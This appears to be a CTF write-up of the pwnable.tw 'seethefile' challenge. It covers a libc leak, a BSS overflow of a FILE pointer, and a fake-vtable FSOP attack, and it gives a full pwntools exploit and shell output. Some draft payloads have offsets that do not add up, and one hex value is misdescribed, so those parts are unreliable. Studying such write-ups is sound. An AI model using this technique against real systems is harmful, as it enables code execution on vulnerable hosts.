+
+      <h3>Fake FILE Struct Layout in BSS</h3>
+      <p>We'll place the fake FILE struct starting at <code class="inline">0x804b260</code> (the <code class="inline">name</code> buffer). When <code class="inline">fclose(fp)</code> is called with <code class="inline">fp = 0x804b260</code>, it will interpret our name buffer as a FILE struct:</p>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">0x804b260</span><span class="mem-arrow">|</span><span class="mem-data mem-green">"/bin/sh\x00"</span><span class="mem-desc">&larr; _flags (offset 0) = argument to __close</span></div>
+        <div class="mem-row"><span class="mem-addr">0x804b268</span><span class="mem-arrow">|</span><span class="mem-data">";" * 0x80</span><span class="mem-desc">&larr; padding through FILE fields</span></div>
+        <div class="mem-row"><span class="mem-addr">0x804b2e8</span><span class="mem-arrow">|</span><span class="mem-data">p32(0)</span><span class="mem-desc">&larr; more padding</span></div>
+        <div class="mem-row"><span class="mem-addr">0x804b2f4</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">p32(fake_vtable)</span><span class="mem-desc">&larr; vtable pointer (offset +0x94)</span></div>
+        <div style="height:12px"></div>
+        <div class="mem-row"><span class="mem-addr">0x804b300</span><span class="mem-arrow">|</span><span class="mem-data mem-orange">[fake vtable]</span><span class="mem-desc">&larr; __close at vtable+0x4c</span></div>
+        <div class="mem-row"><span class="mem-addr">0x804b34c</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">p32(system_addr)</span><span class="mem-desc">&larr; __close = system</span></div>
+      </div>
+
+      <h3>Verifying the fclose Call Chain</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # After overflow, fp = 0x804b260
+gdb-peda$ x/1wx 0x804b28c
+0x804b28c:  0x0804b260   # fp now points to name buffer
+
+gdb-peda$ # Check what fclose will do:
+gdb-peda$ # fclose(fp) -> _IO_file_close_it(fp)
+gdb-peda$ # -> fp->vtable->__close(fp)
+gdb-peda$ # vtable is at *(0x804b260 + 0x94) = *(0x804b2f4)
+gdb-peda$ x/1wx 0x804b2f4
+0x804b2f4:  0x0804b300   # vtable = 0x804b300 (our fake vtable)
+
+gdb-peda$ # __close is at vtable + 0x4c = 0x804b34c
+gdb-peda$ x/1wx 0x804b34c
+0x804b34c:  0xf7e1cxxx   # system() address in libc!
+
+gdb-peda$ # So the call becomes: system(0x804b260)
+gdb-peda$ # And 0x804b260 contains "/bin/sh\x00"
+gdb-peda$ # = system("/bin/sh") -> SHELL!</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview: FSOP (File-Stream Oriented Programming)</h3>
+      <p>The exploit has two phases: <strong>leaking libc</strong> via <code class="inline">/proc/self/maps</code>, then <strong>crafting a fake FILE struct</strong> to hijack the vtable call in <code class="inline">fclose()</code> and redirect it to <code class="inline">system("/bin/sh")</code>.</p>
+
+      <h3>Phase 1: Leak Libc via /proc/self/maps</h3>
+      <ol class="step-list">
+        <li><strong>Open <code class="inline">/proc/self/maps</code></strong> using option 1. This file contains the process memory map, including the base address of libc. The "flag" filter doesn't block this filename.</li>
+        <li><strong>Call readfile() twice.</strong> The first <code class="inline">fread</code> reads the beginning of the file (binary mappings). The second <code class="inline">fread</code> advances the file position further into the mappings where libc's <code class="inline">.so</code> entry appears.</li>
+        <li><strong>Call writefile()</strong> to display the buffer contents. Parse the output to find the libc base address from a line like <code class="inline">f7e14000-f7fb6000 r-xp ... libc-2.23.so</code>.</li>
+        <li><strong>Close the file</strong> using option 4 to reset <code class="inline">fp</code> to <code class="inline">NULL</code>. This is important &mdash; we need <code class="inline">fp</code> to be <code class="inline">NULL</code> before we overwrite it, otherwise <code class="inline">fclose</code> might be called on a stale pointer during the exit path.</li>
+        <li><strong>Calculate libc base:</strong> <code class="inline">libc_base = leaked_address</code> (the start of the r-xp mapping for libc)</li>
+      </ol>
+
+      <h3>Phase 2: FSOP &mdash; Fake FILE Struct + Vtable Hijack</h3>
+      <ol class="step-list">
+        <li><strong>Choose option 5 (Exit)</strong> to trigger the <code class="inline">scanf(" %s", name)</code> overflow.</li>
+        <li><strong>Craft the payload</strong> that fills <code class="inline">name</code> and overflows into <code class="inline">fp</code>:<br>
+          &bull; Bytes 0&ndash;7: <code class="inline">"/bin/sh\x00"</code> &mdash; this becomes <code class="inline">_flags</code> and the argument to <code class="inline">system()</code><br>
+          &bull; Bytes 8&ndash;0x93: padding (fill the rest of the FILE struct fields)<br>
+          &bull; Bytes 0x94&ndash;0x97: <code class="inline">p32(fake_vtable)</code> &mdash; pointer to our fake vtable in BSS<br>
+          &bull; After the FILE struct: fake vtable with <code class="inline">__close</code> at <code class="inline">vtable + 0x4c</code> set to <code class="inline">system</code>
+        </li>
+        <li><strong>The overflow writes <code class="inline">fp = 0x804b260</code></strong> (the start of name buffer). When <code class="inline">fclose(fp)</code> is called, it follows:<br>
+          &bull; <code class="inline">fp-&gt;vtable</code> = <code class="inline">*(0x804b260 + 0x94)</code> = <code class="inline">*(0x804b2f4)</code> = <code class="inline">0x804b300</code> (our fake vtable)<br>
+          &bull; <code class="inline">fp-&gt;vtable-&gt;__close</code> = <code class="inline">*(0x804b300 + 0x4c)</code> = <code class="inline">*(0x804b34c)</code> = <code class="inline">system</code><br>
+          &bull; Called with argument <code class="inline">fp</code> = <code class="inline">0x804b260</code> which starts with <code class="inline">"/bin/sh\x00"</code><br>
+          &bull; Result: <code class="inline">system("/bin/sh")</code> &rarr; <span class="mem-green">SHELL!</span>
+        </li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Why "/bin/sh" in _flags Works</div>
+        The <code class="inline">_flags</code> field at offset 0 of the FILE struct is the first 4 bytes. When <code class="inline">fclose</code> eventually calls <code class="inline">vtable-&gt;__close(fp)</code>, the argument <code class="inline">fp</code> is a pointer to the start of the FILE struct. Since <code class="inline">_flags</code> is at the very beginning, <code class="inline">system(fp)</code> will interpret the memory at <code class="inline">fp</code> as a string. By placing <code class="inline">"/bin/sh\x00"</code> there, <code class="inline">system</code> receives <code class="inline">system("/bin/sh")</code> &mdash; a perfect shell spawn!<br><br>
+        However, we must be careful: <code class="inline">fclose</code> performs several checks on the FILE struct before reaching the vtable call. The <code class="inline">_flags</code> value <code class="inline">0x68732f6e</code> (the integer representation of <code class="inline">"/bin"</code> in little-endian) must not cause <code class="inline">fclose</code> to crash or take an early exit. In glibc 2.23, the critical checks pass because the relevant flag bits are not set in this value.
+      </div>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">open("/proc/self/maps") &rarr; fp = fopen(...)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">readfile() &times; 2 &rarr; advance file position past binary mappings</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">writefile() &rarr; display /proc/self/maps content</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">Parse libc base from output &rarr; <span class="mem-green">LEAK!</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">closefile() &rarr; fp = NULL</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: FSOP exploit</div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">Choose option 5 (Exit)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">Send crafted name payload:</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;"/bin/sh\x00" + padding(0x8c bytes) + p32(0) + p32(fake_vtable)</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;+ fake_vtable[19] = p32(system_addr)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">fclose(fp) &rarr; fp-&gt;vtable-&gt;__close(fp) &rarr; <span class="mem-highlight">system("/bin/sh")</span> &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+
+      <h3>Payload Structure</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python"># name buffer starts at 0x804b260, fp is at 0x804b28c
+# We overflow name to fill the fake FILE struct AND overwrite fp
+
+fake_vtable = 0x804b300   # Place vtable after the FILE struct in BSS
+
+# Build the payload (this goes into name, and overflows into fp)
+payload  = b'/bin/sh\x00'          # _flags (offset 0) - will be arg to system()
+payload += b'\x00' * 0x80          # padding for FILE fields (offsets 0x04 - 0x84)
+payload += p32(0)                   # more padding (offsets 0x84 - 0x90)
+payload += p32(fake_vtable)         # vtable pointer (offset 0x94)
+
+# We also need to overwrite fp (at 0x804b28c) with 0x804b260
+# The payload above fills from name (0x804b260) through vtable (0x804b2f4)
+# But fp at 0x804b28c needs to be 0x804b260
+# So we include fp overwrite within the padding
+
+# Corrected approach:
+payload  = b'/bin/sh\x00'          # offset 0x00: _flags
+payload += b';' * 0x80             # padding (0x04 - 0x84)
+payload += p32(0)                   # padding (0x84 - 0x88)
+payload += p32(fake_vtable)         # offset 0x94: vtable pointer
+# Also, at offset 0x2c from name start = fp location
+# But this is WITHIN our padding above, so we need to be more precise
+
+# The real exploit carefully constructs the entire region</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Important: fp Location Within the Payload</div>
+        The <code class="inline">fp</code> pointer is at offset <code class="inline">0x2c</code> from the start of <code class="inline">name</code>. This falls within the FILE struct padding. Since we're writing the <em>entire</em> region from <code class="inline">name</code> through the vtable pointer, <code class="inline">fp</code> gets naturally overwritten as part of the overflow. The value at offset <code class="inline">0x2c</code> doesn't matter for the FILE struct interpretation (it corresponds to some internal field), but it becomes the new value of <code class="inline">fp</code>. We need <code class="inline">fp = 0x804b260</code> (pointing back to our name buffer), so we place <code class="inline">p32(0x804b260)</code> at offset <code class="inline">0x2c</code> in our payload.
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+seethefile - pwnable.tw (250pts)
+FSOP exploit: overflow name buffer to overwrite FILE pointer,
+then craft fake _IO_FILE_plus with vtable pointing to system.
+
+Vulnerability: scanf(" %s", name) has no width limit,
+allowing overflow from name (0x804b260) into fp (0x804b28c).
+fclose(fp) then calls fp->vtable->__close(fp) = system("/bin/sh").
+"""
+from pwn import *
+
+# Setup
+context.arch = 'i386'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 10200)
+libc = ELF('./libc_32.so.6')
+elf = ELF('./seethefile')
+
+# Known addresses (No PIE, so these are fixed)
+NAME_ADDR = 0x804b260
+FP_ADDR   = 0x804b28c
+FAKE_VTABLE = 0x804b300   # Place vtable after FILE struct in BSS
+
+# Helper functions
+def openfile(filename):
+    r.sendlineafter(b':', b'1')
+    r.sendlineafter(b':', filename)
+
+def readfile():
+    r.sendlineafter(b':', b'2')
+
+def writefile():
+    r.sendlineafter(b':', b'3')
+
+def closefile():
+    r.sendlineafter(b':', b'4')
+
+def exit_with_name(name):
+    r.sendlineafter(b':', b'5')
+    r.sendlineafter(b':', name)
+
+# ============================================
+# Phase 1: Leak libc address via /proc/self/maps
+# ============================================
+log.info("Phase 1: Leaking libc address via /proc/self/maps...")
+
+# Open the process memory map (bypasses "flag" filter)
+openfile(b'/proc/self/maps')
+
+# Read twice to advance past the binary mappings
+# and reach the libc mapping in the output
+readfile()
+readfile()
+
+# Write (display) the buffer contents
+writefile()
+r.recvuntil(b'-------------------------------\n')
+maps_output = r.recvuntil(b'-------------------------------')
+
+# Parse the libc base address from the maps output
+# Look for a line like: f7e14000-f7fb6000 r-xp ... libc-2.23.so
+libc_lines = []
+for line in maps_output.split(b'\n'):
+    if b'libc' in line and b'r-xp' in line:
+        libc_lines.append(line.decode())
+
+if libc_lines:
+    libc_base_str = libc_lines[0].split('-')[0]
+    libc.address = int(libc_base_str, 16)
+    log.success(f"libc base: {hex(libc.address)}")
+else:
+    # Fallback: look for any .so mapping
+    for line in maps_output.split(b'\n'):
+        if b'.so' in line and b'r-xp' in line:
+            libc_base_str = line.decode().split('-')[0]
+            libc.address = int(libc_base_str, 16)
+            log.success(f"libc base (fallback): {hex(libc.address)}")
+            break
+
+# Close the file to set fp = NULL (important for clean state)
+closefile()
+
+# ============================================
+# Phase 2: FSOP - Fake FILE struct + vtable hijack
+# ============================================
+log.info("Phase 2: Crafting fake FILE struct for FSOP...")
+
+system_addr = libc.symbols['system']
+log.info(f"system @ {hex(system_addr)}")
+
+# Build the fake FILE struct in the name buffer
+# name starts at 0x804b260
+# fp is at 0x804b28c (offset 0x2c from name)
+#
+# We need to:
+# 1. Place "/bin/sh\x00" at offset 0 (_flags) -> becomes arg to system()
+# 2. Place p32(NAME_ADDR) at offset 0x2c -> overwrites fp
+# 3. Place p32(FAKE_VTABLE) at offset 0x94 -> vtable pointer
+# 4. Place p32(system_addr) at FAKE_VTABLE + 0x4c -> __close = system
+#
+# The payload spans from name (0x804b260) to cover fp and the vtable area
+
+payload = b''
+
+# Offset 0x00: _flags = "/bin/sh\x00" (argument to system when __close is called)
+payload += b'/bin/sh\x00'
+
+# Offset 0x08 to 0x2b: padding (FILE struct internal fields)
+# We need to be careful - at offset 0x2c is fp
+payload += b'\x00' * (0x2c - 0x08)
+
+# Offset 0x2c: overwrite fp with NAME_ADDR (point to our fake FILE)
+payload += p32(NAME_ADDR)
+
+# Offset 0x30 to 0x93: more FILE struct padding
+payload += b'\x00' * (0x94 - 0x30)
+
+# Offset 0x94: vtable pointer -> points to our fake vtable
+payload += p32(FAKE_VTABLE)
+
+# Now we need to place the fake vtable at 0x804b300
+# The vtable has __close at offset 0x4c (19th entry, 4 bytes each)
+# But our payload is being written starting at NAME_ADDR (0x804b260)
+# 0x804b300 - 0x804b260 = 0xa0 bytes from the start
+# So we need 0xa0 - 0x98 = 0x08 more bytes of padding, then fill the vtable
+
+# Wait, let's recalculate:
+# After the vtable pointer (offset 0x98 from start), we need to reach
+# offset 0xa0 (0x804b300 - 0x804b260) for the fake vtable start
+payload += b'\x00' * (0xa0 - 0x98)
+
+# Now at 0x804b300: fake vtable
+# __close is at vtable + 0x4c (19th entry)
+# Fill vtable entries 0-18 with junk/safe addresses, then __close = system
+payload += p32(0) * 19          # 19 dummy entries (indices 0-18)
+payload += p32(system_addr)     # __close (index 19, offset 0x4c)
+
+# Trigger the overflow via option 5
+log.info("Triggering FSOP via exit overflow...")
+r.sendlineafter(b':', b'5')
+r.sendlineafter(b':', payload)
+
+# We should now have a shell!
+r.interactive()</code></pre>
+      </div>
+
+      <h3>Alternative: One-shot Payload</h3>
+      <p>Some implementations combine the fake vtable entries more compactly. Here's a cleaner version using <code class="inline">FileStructure</code> from pwntools:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python"># Alternative: manual construction (from srikavin.me approach)
+# name at 0x804b260, fp at 0x804b28c
+# fake_vtable at 0x804b300
+
+fake_vtable = 0x804b300
+
+# The key insight: we write from name, overflow past fp,
+# and continue writing all the way through the FILE struct + vtable
+payload  = b'/bin/sh\x00'        # _flags: becomes argument to system()
+payload += b';' * 0x80           # padding through FILE fields
+payload += p32(0)                # more padding
+payload += p32(fake_vtable)      # vtable pointer at offset +0x94
+
+# At this point we've written 0x98 bytes from name start
+# fp was at offset 0x2c and got overwritten as part of the padding
+# The value at offset 0x2c happens to be within the ";" padding
+# We need fp = 0x804b260, so we need to be more precise:
+
+# Better approach: build payload byte by byte
+payload = bytearray(0xa0 + 0x50)  # enough for FILE struct + vtable area
+
+# _flags = "/bin/sh\x00"
+payload[0:8] = b'/bin/sh\x00'
+
+# fp overwrite at offset 0x2c
+struct.pack_into('&lt;I', payload, 0x2c, NAME_ADDR)
+
+# vtable pointer at offset 0x94
+struct.pack_into('&lt;I', payload, 0x94, fake_vtable)
+
+# fake vtable: __close at vtable + 0x4c
+# vtable starts at payload offset 0xa0 (0x804b300 - 0x804b260)
+struct.pack_into('&lt;I', payload, 0xa0 + 0x4c, system_addr)
+
+payload = bytes(payload)</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/seethefile'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/home/user/libc_32.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.pwnable.tw on port 10200: Done
+[*] Phase 1: Leaking libc address via /proc/self/maps...
+[+] libc base: 0xf7e14000
+[*] system @ 0xf7e1cda0
+[*] Phase 2: Crafting fake FILE struct for FSOP...
+[*] Triggering FSOP via exit overflow...
+[*] Switching to interactive mode
+
+$ id
+uid=1000(seethefile) gid=1000(seethefile) groups=1000(seethefile)
+$ cat /home/seethefile/flag</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Pwned!</div>
+        The exploit successfully:<br>
+        &bull; <strong>Leaked libc</strong> by reading <code class="inline">/proc/self/maps</code> through the file viewer interface<br>
+        &bull; <strong>Overflowed the name buffer</strong> into the <code class="inline">fp</code> pointer, making it point to our fake FILE struct<br>
+        &bull; <strong>Crafted a fake _IO_FILE_plus</strong> with <code class="inline">"/bin/sh"</code> in <code class="inline">_flags</code> and a vtable pointing to <code class="inline">system</code><br>
+        &bull; <strong>Hijacked the fclose vtable call</strong> to execute <code class="inline">system("/bin/sh")</code> instead of <code class="inline">__close</code><br>
+        &bull; Got a shell and captured the flag!
+      </div>
+
+      <h3>Flag</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">flag</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash"></code></pre>
+      </div>
+
+      <h3>Key Takeaways</h3>
+      <ol class="step-list">
+        <li><strong>scanf("%s") is always dangerous</strong> &mdash; even in BSS, not just on the stack. Without a width specifier, it allows unbounded writes that can corrupt adjacent global variables.</li>
+        <li><strong>FILE structs are powerful attack surfaces</strong> &mdash; glibc's <code class="inline">_IO_FILE_plus</code> contains a vtable pointer that is dereferenced during operations like <code class="inline">fclose</code>. Controlling a FILE pointer gives you a call-to-where primitive via FSOP.</li>
+        <li><strong>/proc/self/maps is a universal leak</strong> &mdash; when you can read arbitrary files (except those filtered by name), <code class="inline">/proc/self/maps</code> reveals the full memory layout including library base addresses.</li>
+        <li><strong>_flags as argument</strong> &mdash; since <code class="inline">fclose(fp)</code> ultimately calls <code class="inline">vtable-&gt;__close(fp)</code>, the <code class="inline">fp</code> pointer itself is the first argument. By placing <code class="inline">"/bin/sh\x00"</code> at the start of the fake FILE struct, <code class="inline">system()</code> receives a shell command.</li>
+      </ol>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a> | </p>
+</footer>
+
+<!-- Three.js Particles -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particles = [];
+  const particleCount = 80;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+
+  for (let i = 0; i < particleCount; i++) {
+    const x = (Math.random() - 0.5) * 100;
+    const y = (Math.random() - 0.5) * 100;
+    const z = (Math.random() - 0.5) * 50;
+    positions[i * 3] = x;
+    positions[i * 3 + 1] = y;
+    positions[i * 3 + 2] = z;
+    particles.push({ x, y, z, vx: (Math.random() - 0.5) * 0.02, vy: (Math.random() - 0.5) * 0.02 });
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  const material = new THREE.PointsMaterial({ color: 0x38bdf8, size: 0.5, transparent: true, opacity: 0.4 });
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  const lineMaterial = new THREE.LineBasicMaterial({ color: 0x38bdf8, transparent: true, opacity: 0.08 });
+  const lineGeometry = new THREE.BufferGeometry();
+  const linePositions = new Float32Array(particleCount * particleCount * 6);
+  lineGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+  scene.add(lines);
+
+  function animate() {
+    requestAnimationFrame(animate);
+
+    const pos = points.geometry.attributes.position.array;
+    for (let i = 0; i < particleCount; i++) {
+      particles[i].x += particles[i].vx;
+      particles[i].y += particles[i].vy;
+      if (Math.abs(particles[i].x) > 50) particles[i].vx *= -1;
+      if (Math.abs(particles[i].y) > 50) particles[i].vy *= -1;
+      pos[i * 3] = particles[i].x;
+      pos[i * 3 + 1] = particles[i].y;
+    }
+    points.geometry.attributes.position.needsUpdate = true;
+
+    let lineIdx = 0;
+    const lPos = lines.geometry.attributes.position.array;
+    for (let i = 0; i < particleCount; i++) {
+      for (let j = i + 1; j < particleCount; j++) {
+        const dx = particles[i].x - particles[j].x;
+        const dy = particles[i].y - particles[j].y;
+        const dist = Math.sqrt(dx * dx + dy * dy);
+        if (dist < 15) {
+          lPos[lineIdx++] = particles[i].x;
+          lPos[lineIdx++] = particles[i].y;
+          lPos[lineIdx++] = particles[i].z;
+          lPos[lineIdx++] = particles[j].x;
+          lPos[lineIdx++] = particles[j].y;
+          lPos[lineIdx++] = particles[j].z;
+        }
+      }
+    }
+    for (let i = lineIdx; i < lPos.length; i++) lPos[i] = 0;
+    lines.geometry.attributes.position.needsUpdate = true;
+
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Scroll Spy -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('#toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) current = ch.id;
+    });
+    tocLinks.forEach(link => {
+      link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
